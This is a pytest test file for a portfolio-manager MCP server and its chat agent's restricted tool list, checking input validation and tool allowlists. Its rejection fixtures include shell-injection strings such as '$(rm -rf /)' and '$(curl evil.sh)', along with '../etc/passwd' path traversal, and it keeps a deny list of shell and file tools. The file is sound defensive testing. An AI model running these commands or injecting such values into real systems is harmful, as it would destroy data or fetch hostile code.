"""Tests for the owlfolio MCP server and the chat agent's locked-down tool surface.

These pin the security contract:
  - The chat agent's allowed_tools never includes Bash, Read, Glob, Grep, Edit, Write.
  - The chat agent's allowed_tools always includes the owlfolio MCP tool surface
    plus WebSearch + WebFetch.
  - Every MCP tool has a typed input schema and rejects bad input cleanly.
  - The operation layer rejects malformed tickers and strategy names.
"""

from __future__ import annotations

import asyncio
import json
from pathlib import Path

import pytest

from src.mcp_server import ALL_TOOLS, allowed_tool_names
from src.operations import validate_strategy_name, validate_ticker

PROJECT_DIR = Path(__file__).parent.parent


# ─── Operation-layer input validation ─────────────────────────────────


def test_validate_ticker_accepts_normal_tickers():
    assert validate_ticker("AAPL") == "AAPL"
    assert validate_ticker("aapl") == "AAPL"
    assert validate_ticker(" SPGI ") == "SPGI"
    assert validate_ticker("BRK.B") == "BRK.B"
    assert validate_ticker("BF-A") == "BF-A"


def test_validate_ticker_accepts_yfinance_international_suffixes():
    """yfinance routes non-US listings via .EXCHANGE suffixes. The
    validator must accept these — earlier 10-char / letter-leading
    regex rejected ADNOC Gas (`ADNOCGAS.AD`, 11 chars) and HK tickers
    (digit-leading like `0700.HK`)."""
    # Abu Dhabi, NSE India, Toronto, London, etc.
    assert validate_ticker("ADNOCGAS.AD") == "ADNOCGAS.AD"
    assert validate_ticker("BHARTIARTL.NS") == "BHARTIARTL.NS"
    assert validate_ticker("RY.TO") == "RY.TO"
    assert validate_ticker("BARC.L") == "BARC.L"
    # Hong Kong + Shanghai use digit-leading roots
    assert validate_ticker("0700.HK") == "0700.HK"
    assert validate_ticker("600519.SS") == "600519.SS"


@pytest.mark.parametrize("bad", [
    "",                       # empty
    "$(rm -rf /)",            # shell injection
    "AAPL; rm -rf /",         # shell injection
    "AAAAAAAAAAAAAAAAA",      # 17 chars — over the 15 limit
    ".AAPL",                  # leading punctuation
    "-AAPL",                  # leading hyphen
    "../etc/passwd",          # path traversal
    "AAPL\nBAD",              # newline / control chars
    "AAPL BAD",               # whitespace inside
    "AAPL@NYSE",              # disallowed char
    None,                     # not a string
    123,                      # not a string
])
def test_validate_ticker_rejects_bad_input(bad):
    with pytest.raises(ValueError):
        validate_ticker(bad)  # type: ignore[arg-type]


def test_validate_strategy_name_accepts_presets():
    for name in ("buffett-munger", "100-bagger", "growth", "deep-value"):
        assert validate_strategy_name(name) == name


@pytest.mark.parametrize("bad", [
    "",
    "Buffett-Munger",          # uppercase
    "../strategies/secret",    # path traversal
    "strategy; rm -rf /",      # shell injection
    "a" * 50,                  # too long
    None,
])
def test_validate_strategy_name_rejects_bad_input(bad):
    with pytest.raises(ValueError):
        validate_strategy_name(bad)  # type: ignore[arg-type]


# ─── MCP server registration ─────────────────────────────────────────


def test_mcp_server_registers_all_tools():
    """27 tools should be registered, covering every chat-agent need."""
    assert len(ALL_TOOLS) >= 25, "expected at least 25 MCP tools"
    names = {t.name for t in ALL_TOOLS}
    # Spot-check the critical ones across each category
    for required in (
        "get_portfolio", "get_watchlist", "get_alerts", "list_tasks",
        "get_active_strategy", "list_specialists",
        "list_analyses", "get_latest_analysis",
        "list_memories", "get_doctor_report",
        "analyze", "get_price",
        # Candidate-list pipeline (replaces the legacy screen tool)
        "find_candidates", "import_candidates", "list_candidate_lists",
        "get_candidate_list", "analyze_candidate_list", "delete_candidate_list",
        "add_holding", "sell_holding", "add_to_watchlist",
        "remember", "forget", "schedule_task", "switch_strategy",
    ):
        assert required in names, f"MCP tool {required!r} missing"
    # Legacy screener tool should be gone
    assert "screen" not in names, "legacy `screen` tool was removed; should not be re-added"


def test_allowed_tool_names_format():
    """Tool names follow the mcp__<server>__<tool> convention."""
    names = allowed_tool_names()
    assert len(names) == len(ALL_TOOLS)
    for n in names:
        assert n.startswith("mcp__owlfolio__"), f"bad MCP tool name: {n!r}"


# ─── Chat agent tool-surface contract (the security pin) ──────────────


def test_web_chat_agent_has_no_bash_no_read_no_raw_web():
    """src/web/app.py must lock the chat agent to MCP tools ONLY.

    No Bash/Read/Glob/Grep/Edit/Write/NotebookEdit AND no raw
    WebSearch/WebFetch — the chat agent is a portfolio manager, not a
    web researcher. General-purpose finance questions go through the
    typed `mcp__owlfolio__quick_research` wrapper.
    """
    src = (PROJECT_DIR / "src" / "web" / "app.py").read_text()
    assert "mcp_servers={\"owlfolio\": OWLFOLIO_MCP}" in src, (
        "web chat must register the owlfolio MCP server"
    )
    # Allowed_tools should be ONLY the typed MCP names — no raw web tools tacked on
    assert "allowed_tools=allowed_tool_names()" in src, (
        "web chat allowed_tools must be the MCP tool names ONLY, "
        "no WebSearch/WebFetch tacked on"
    )
    # Disallowed_tools must explicitly include the web tools as defense-in-depth
    chat_block_start = src.index("async def websocket_chat")
    chat_block_end = (
        src.index("async def", chat_block_start + 10)
        if "async def" in src[chat_block_start + 10:] else len(src)
    )
    chat_block = src[chat_block_start:chat_block_end]
    for forbidden in (
        '"Bash"', '"Read"', '"Glob"', '"Grep"', '"Edit"', '"Write"',
        '"WebSearch"', '"WebFetch"',
    ):
        assert forbidden in chat_block, (
            f"web chat must explicitly disallow {forbidden}"
        )
    # And those tools must NOT appear in allowed_tools
    allowed_line = next(l for l in chat_block.splitlines() if "allowed_tools=" in l)
    for forbidden in (
        '"Bash"', '"Read"', '"Glob"', '"Grep"', '"Edit"', '"Write"',
        '"WebSearch"', '"WebFetch"',
    ):
        assert forbidden not in allowed_line, (
            f"web chat allowed_tools must not contain {forbidden}"
        )


def test_cli_chat_agent_has_no_bash_no_read_no_raw_web():
    """src/agent/core.py must lock the CLI chat agent to MCP tools ONLY.

    Same contract as the web chat — no Bash/Read/Glob/Grep/Edit/Write
    and no raw WebSearch/WebFetch. The CLI chat shares CLAUDE.md and
    the allowed-tool surface with the web chat.
    """
    src = (PROJECT_DIR / "src" / "agent" / "core.py").read_text()
    assert "mcp_servers={\"owlfolio\": OWLFOLIO_MCP}" in src, (
        "CLI chat must register the owlfolio MCP server"
    )
    assert "allowed_tools=allowed_tool_names()" in src, (
        "CLI chat allowed_tools must be the MCP tool names ONLY"
    )
    allowed_lines = [
        l for l in src.splitlines()
        if "allowed_tools=" in l and "#" not in l.split("allowed_tools=")[0]
    ]
    assert allowed_lines
    for line in allowed_lines:
        for forbidden in (
            '"Bash"', '"Read"', '"Glob"', '"Grep"', '"Edit"', '"Write"',
            '"WebSearch"', '"WebFetch"',
        ):
            assert forbidden not in line, (
                f"CLI chat allowed_tools must not contain {forbidden}: {line.strip()}"
            )


def test_quick_research_tool_registered():
    """The bounded WebSearch escape-hatch tool must be on the agent's
    allowlist so the chat agent can call it for general-purpose
    finance questions."""
    from src.mcp_server import ALL_TOOLS, allowed_tool_names

    names = {t.name for t in ALL_TOOLS}
    assert "quick_research" in names, "quick_research MCP tool not registered"
    assert "mcp__owlfolio__quick_research" in allowed_tool_names()


# ─── Read-only tool happy paths (no Claude, no network) ───────────────


def _call(tool, args):
    """Invoke an MCP tool synchronously via its async handler."""
    return asyncio.run(tool.handler(args))


def test_list_strategies_tool_returns_presets():
    from src.mcp_server import list_strategies
    resp = _call(list_strategies, {})
    assert resp.get("is_error") is not True
    payload = json.loads(resp["content"][0]["text"])
    names = {s["name"] for s in payload}
    assert {"buffett-munger", "100-bagger", "growth", "deep-value"}.issubset(names)


def test_get_active_strategy_tool_returns_summary():
    from src.mcp_server import get_active_strategy
    resp = _call(get_active_strategy, {})
    assert resp.get("is_error") is not True
    payload = json.loads(resp["content"][0]["text"])
    assert "name" in payload and "criteria" in payload and "specialists" in payload


def test_get_strategy_info_rejects_bad_name():
    from src.mcp_server import get_strategy_info
    resp = _call(get_strategy_info, {"name": "../etc/passwd"})
    assert resp.get("is_error") is True
    assert "invalid strategy name" in resp["content"][0]["text"]


def test_list_specialists_returns_active_roster():
    from src.mcp_server import list_specialists
    resp = _call(list_specialists, {})
    assert resp.get("is_error") is not True
    payload = json.loads(resp["content"][0]["text"])
    assert isinstance(payload, list) and len(payload) >= 3
    # Each entry has a name and a self-contained prompt body (post-restructure)
    assert all("name" in s and "prompt_body" in s for s in payload)


def test_get_doctor_report_returns_health_dict():
    from src.mcp_server import get_doctor_report
    resp = _call(get_doctor_report, {})
    assert resp.get("is_error") is not True
    payload = json.loads(resp["content"][0]["text"])
    for key in ("python", "credentials", "strategy", "database", "runtime"):
        assert key in payload


def test_analyze_tool_rejects_shell_metachars_in_ticker():
    """Defense in depth: the analyze tool must reject malformed tickers
    even though the underlying pipeline never shells out."""
    from src.mcp_server import analyze
    resp = _call(analyze, {"ticker": "AAPL; rm -rf /"})
    assert resp.get("is_error") is True
    assert "invalid ticker" in resp["content"][0]["text"]


def test_add_holding_rejects_bad_inputs():
    from src.mcp_server import add_holding
    # Bad ticker
    resp = _call(add_holding, {"ticker": "$(curl evil.sh)", "shares": 10, "cost_basis": 100})
    assert resp.get("is_error") is True
    # Negative shares
    resp = _call(add_holding, {"ticker": "AAPL", "shares": -5, "cost_basis": 100})
    assert resp.get("is_error") is True
    # Zero cost basis
    resp = _call(add_holding, {"ticker": "AAPL", "shares": 5, "cost_basis": 0})
    assert resp.get("is_error") is True


def test_switch_strategy_rejects_path_traversal():
    from src.mcp_server import switch_strategy
    resp = _call(switch_strategy, {"name": "../../../../etc/passwd"})
    assert resp.get("is_error") is True
    assert "invalid strategy name" in resp["content"][0]["text"]
